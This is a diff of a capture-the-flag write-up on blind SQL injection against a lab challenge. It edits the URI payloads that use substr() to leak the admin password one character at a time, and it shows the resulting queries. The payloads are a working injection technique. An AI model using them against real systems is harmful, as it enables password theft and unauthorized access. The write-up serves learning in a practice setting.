@@ -82,22 +82,22 @@ Next, we can leak the password byte by byte using the `substr()` function.
 If we provide the following URI:
 
 ```
-?pw=' OR id='admin' AND substr(pw, 1, 1)=0 -- -
+?pw=' OR id='admin' AND substr(pw, 1, 1)='0' -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)=0 -- -'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)='0' -- -'
 
 ## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)=0 #
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)='0'
 
 ## Commented part:
 '
 ```
 
-![5](https://github.com/Kunull/Write-ups/assets/110326359/065bf0e4-ef24-4a09-8482-036850cd9c18)
+![5](https://github.com/Kunull/Write-ups/assets/110326359/d479be75-0818-47a3-8d89-991e9dcd1926)
 
 Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
 That tells us that the first character of the `pw` for `id=admin` is `0`.
@@ -105,22 +105,22 @@ That tells us that the first character of the `pw` for `id=admin` is `0`.
 We can now move onto the second character:
 
 ```
-?pw=' OR id='admin' AND substr(pw, 2, 1)=0 -- -
+?pw=' OR id='admin' AND substr(pw, 2, 1)='0' -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=0 -- -'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='0' -- -'
 
 ## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=0
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='0'
 
 ## Commented part:
 '
 ```
 
-![6](https://github.com/Kunull/Write-ups/assets/110326359/ca4364db-8e79-4a25-ad50-0b8889822c72)
+![6](https://github.com/Kunull/Write-ups/assets/110326359/557a333a-920a-485b-926b-e87bfbf8b8f4)
 
 Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
 That tells us that the second character of the `pw` for `id=admin` is not `0`.
@@ -128,22 +128,22 @@ That tells us that the second character of the `pw` for `id=admin` is not `0`.
 We can try other characters moving up to the following:
 
 ```
-?pw=' OR id='admin' AND substr(pw, 2, 1)=9 -- -
+?pw=' OR id='admin' AND substr(pw, 2, 1)='9' -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=9 -- -'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='9' -- -'
 
 ## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=9
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='9'
 
 ## Commented part:
 '
 ```
 
-![7](https://github.com/Kunull/Write-ups/assets/110326359/f9133a16-4799-4f4b-bfe3-2105d61d3e72)
+![7](https://github.com/Kunull/Write-ups/assets/110326359/e9d938ad-34aa-4f07-8e9b-167b5d1ec34d)
 
 Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
 That tells us that the second character of the `pw` for `id=admin` is `9`.
